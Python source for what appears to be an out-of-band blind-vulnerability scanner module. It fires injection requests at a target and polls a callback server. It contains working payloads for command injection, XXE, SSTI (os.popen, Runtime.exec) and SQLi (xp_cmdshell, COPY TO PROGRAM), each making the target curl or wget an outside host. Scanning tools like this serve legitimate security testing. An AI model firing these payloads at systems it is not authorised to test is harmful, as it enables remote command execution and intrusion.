"""
OOB (Out-of-Band) Injector — detects blind vulnerabilities by injecting
payloads containing callback URLs and polling the OOB server for hits.

Covers: blind command injection, blind SSRF, blind XXE, blind SSTI, blind SQLi.
"""

import asyncio
import json
import logging
import time
import uuid
from datetime import datetime, timezone

import httpx

from config import (
    OOB_DEFAULT_URL, OOB_POLL_INTERVAL, OOB_POLL_DURATION,
    SCAN_DEFAULT_TIMEOUT, SCAN_RESPONSE_CAP, PROXY_HOST, PROXY_PORT,
)
from injectors.base import (
    BaseInjector, _build_targets, _DROP_HEADERS, _SCAN_MARKER,
    _inject_into_body, _normalize_url_params, _replace_path_segment,
)
from models.scan_config import ScanResult, VulnerabilityReport

log = logging.getLogger(__name__)


class OOBInjector(BaseInjector):
    """Blind vulnerability scanner using out-of-band callback detection."""

    name = "oob"
    description = "OOB (Blind) — detects blind SSRF, XXE, command injection, SSTI, SQLi via callbacks"

    _ALL_TYPES = ["cmd", "ssrf", "xxe", "ssti", "sqli"]

    def __init__(
        self,
        oob_base_url: str = OOB_DEFAULT_URL,
        poll_duration: float = OOB_POLL_DURATION,
        enabled_types: list[str] | None = None,
    ) -> None:
        super().__init__()
        self._oob_base_url = oob_base_url.rstrip("/")
        self._poll_duration = poll_duration
        self._enabled_types = enabled_types or self._ALL_TYPES

    # ── Not used directly — payloads are dynamic with embedded tokens ──

    def generate_payloads(self, context: dict) -> list[str]:
        return []

    def analyze_response(self, baseline, test_response, payload):
        return VulnerabilityReport()

    # ── Payload generation ────────────────────────────────────────────

    def _generate_oob_payloads(self, scan_key: str) -> list[tuple[str, str, str]]:
        """Generate (payload, token, sub_type) tuples with unique callback URLs.

        Each payload gets a unique token so callbacks can be correlated back
        to the exact payload that triggered them.
        """
        payloads = []

        def _add(template_fn, sub_type):
            if sub_type not in self._enabled_types:
                return
            token = uuid.uuid4().hex[:10]
            url = f"{self._oob_base_url}/{scan_key}/{token}"
            payload = template_fn(url)
            payloads.append((payload, token, sub_type))

        # ── Blind Command Injection ──
        _add(lambda u: f"; curl {u} #", "cmd")
        _add(lambda u: f"$(curl {u})", "cmd")
        _add(lambda u: f"`curl {u}`", "cmd")
        _add(lambda u: f"| curl {u}", "cmd")
        _add(lambda u: f"| wget -q {u}", "cmd")
        _add(lambda u: f"; wget -q {u} #", "cmd")
        _add(lambda u: f"& curl {u}", "cmd")
        _add(lambda u: f"\ncurl {u}\n", "cmd")

        # ── Blind SSRF ──
        _add(lambda u: u, "ssrf")
        _add(lambda u: f"{u}?a=1", "ssrf")

        # ── Blind XXE ──
        _add(
            lambda u: (
                f'<?xml version="1.0"?><!DOCTYPE foo ['
                f'<!ENTITY xxe SYSTEM "{u}">]>'
                f'<foo>&xxe;</foo>'
            ),
            "xxe",
        )
        _add(
            lambda u: (
                f'<?xml version="1.0"?><!DOCTYPE foo ['
                f'<!ENTITY % xxe SYSTEM "{u}">'
                f'%xxe;]><foo>bar</foo>'
            ),
            "xxe",
        )

        # ── Blind SSTI ──
        _add(lambda u: f'{{% import os %}}{{{{ os.popen("curl {u}").read() }}}}', "ssti")
        _add(lambda u: f'${{T(java.lang.Runtime).getRuntime().exec("curl {u}")}}', "ssti")
        _add(lambda u: f'#{{T(java.lang.Runtime).getRuntime().exec("curl {u}")}}', "ssti")

        # ── Blind SQLi (DB-specific OOB) ──
        _add(lambda u: f"'; EXEC xp_cmdshell('curl {u}'); --", "sqli")
        _add(lambda u: f"'; COPY (SELECT '') TO PROGRAM 'curl {u}'; --", "sqli")
        _add(lambda u: f"' UNION SELECT LOAD_FILE('{u}')-- -", "sqli")

        return payloads

    # ── Main scan loop ────────────────────────────────────────────────

    async def test_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: dict | None = None,
        headers: dict | None = None,
        body: str = "",
        injection_points: list[str] | None = None,
        target_keys: list[str] | None = None,
        timeout: float = SCAN_DEFAULT_TIMEOUT,
        on_result=None,
        control: dict | None = None,
    ) -> list[ScanResult]:
        params = params or {}
        headers = headers or {}
        injection_points = injection_points or ["params"]
        ctrl = control or {"signal": "run"}
        results: list[ScanResult] = []

        url, params = _normalize_url_params(url, params)

        # 1. Health-check the OOB server — fail fast if unreachable
        try:
            async with httpx.AsyncClient(verify=False, timeout=10.0) as hc:
                resp = await hc.get(f"{self._oob_base_url}/api/health")
                if resp.status_code != 200:
                    raise ConnectionError(f"OOB server returned {resp.status_code}")
        except Exception as e:
            log.error("OOB health check failed: %s", e)
            err = ScanResult(
                timestamp=datetime.now(timezone.utc).isoformat(),
                target_url=url,
                injector_type="oob",
                payload="(health check)",
                is_vulnerable=False,
                confidence="low",
                details=f"OOB server unreachable: {e}",
            )
            if on_result:
                await on_result(err, 1, 1)
            return [err]

        # 2. Generate payloads with unique tokens
        scan_key = uuid.uuid4().hex[:12]
        oob_payloads = self._generate_oob_payloads(scan_key)
        token_map: dict[str, tuple[str, str]] = {}  # token → (payload, sub_type)
        for payload_str, token, sub_type in oob_payloads:
            token_map[token] = (payload_str, sub_type)

        # 3. Build injection targets
        targets = _build_targets(injection_points, params, headers, body, target_keys, url)
        total_injections = len(oob_payloads) * len(targets)
        # total = injections + 1 (polling phase)
        total = total_injections + 1

        # Track which token was injected into which target
        token_target_map: dict[str, tuple[str, str]] = {}  # token → (injection_point, key)

        # 4. Inject all payloads
        proxy_url = f"http://{PROXY_HOST}:{PROXY_PORT}"
        idx = 0
        async with httpx.AsyncClient(verify=False, timeout=timeout, proxy=proxy_url) as client:
            for payload_str, token, sub_type in oob_payloads:
                for point, key in targets:
                    # Control signals
                    while ctrl.get("signal") == "pause":
                        await asyncio.sleep(0.5)
                    if ctrl.get("signal") == "stop":
                        self.results.extend(results)
                        return results

                    token_target_map[token] = (point, key)

                    # Send the injection request (we don't analyze the response)
                    await self._inject_one(
                        client, url, method, params, headers, body,
                        payload_str, point, key,
                    )
                    idx += 1
                    # Emit a non-vulnerable placeholder so progress updates
                    placeholder = ScanResult(
                        timestamp=datetime.now(timezone.utc).isoformat(),
                        target_url=url,
                        injector_type=f"oob:{sub_type}",
                        payload=payload_str,
                        injection_point=point,
                        original_param=key,
                        response_code=0,
                        is_vulnerable=False,
                        confidence="low",
                        details="Injected — waiting for callback...",
                    )
                    results.append(placeholder)
                    if on_result:
                        await on_result(placeholder, idx, total)

        # 5. Polling phase — check OOB server for callbacks
        start_time = time.time()
        poll_end = time.time() + self._poll_duration
        seen_tokens: set[str] = set()

        while time.time() < poll_end:
            if ctrl.get("signal") == "stop":
                break

            await asyncio.sleep(OOB_POLL_INTERVAL)

            try:
                async with httpx.AsyncClient(verify=False, timeout=10.0) as poll_client:
                    poll_resp = await poll_client.get(
                        f"{self._oob_base_url}/api/callbacks/{scan_key}",
                        params={"since": start_time},
                    )
                    if poll_resp.status_code != 200:
                        continue
                    callbacks = poll_resp.json()
            except Exception:
                continue

            if not isinstance(callbacks, list):
                callbacks = callbacks.get("callbacks", []) if isinstance(callbacks, dict) else []

            for cb in callbacks:
                cb_token = cb.get("token", "")
                if cb_token in seen_tokens or cb_token not in token_map:
                    continue
                seen_tokens.add(cb_token)

                payload_str, sub_type = token_map[cb_token]
                inj_point, inj_key = token_target_map.get(cb_token, ("unknown", "unknown"))

                source_ip = cb.get("source_ip", cb.get("ip", "unknown"))
                cb_time = cb.get("timestamp", cb.get("time", ""))

                confirmed = ScanResult(
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    target_url=url,
                    injector_type=f"oob:{sub_type}",
                    payload=payload_str,
                    injection_point=inj_point,
                    original_param=inj_key,
                    response_code=0,
                    is_vulnerable=True,
                    confidence="high",
                    details=(
                        f"OOB callback received! Type: {sub_type} | "
                        f"Source IP: {source_ip} | Callback at: {cb_time}"
                    ),
                )
                results.append(confirmed)
                idx += 1
                if on_result:
                    await on_result(confirmed, idx, total)

        # Store context for post-scan recheck loop (used by routes.py)
        self._recheck_info = {
            "oob_base_url": self._oob_base_url,
            "scan_key": scan_key,
            "token_map": dict(token_map),
            "token_target_map": dict(token_target_map),
            "url": url,
            "seen_tokens": set(seen_tokens),
            "start_time": start_time,
        }

        self.results.extend(results)
        return results

    # ── Injection helper ──────────────────────────────────────────────

    async def _inject_one(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        params: dict,
        headers: dict,
        body: str,
        payload: str,
        injection_point: str,
        target_key: str,
    ) -> None:
        """Fire one injection request. We don't analyze the response — detection is via OOB."""
        mod_params = dict(params)
        mod_headers = {
            k: v for k, v in headers.items()
            if k.lower() not in _DROP_HEADERS
        }
        mod_headers.update(_SCAN_MARKER)
        mod_body = body
        mod_url = url

        if injection_point == "params" and target_key in mod_params:
            mod_params[target_key] = payload
        elif injection_point == "paths":
            orig_segment = target_key.lstrip("/")
            mod_url = _replace_path_segment(url, orig_segment, payload)
        elif injection_point == "headers" and target_key in mod_headers:
            mod_headers[target_key] = payload
        elif injection_point == "body":
            mod_body, _ = _inject_into_body(body, target_key, payload)

        try:
            if method.upper() == "GET":
                await client.get(mod_url, params=mod_params, headers=mod_headers)
            else:
                await client.request(
                    method, mod_url,
                    params=mod_params,
                    headers=mod_headers,
                    content=mod_body.encode("utf-8") if mod_body else b"",
                )
        except Exception as e:
            log.debug("OOB injection request failed for payload %r: %s", payload, e)
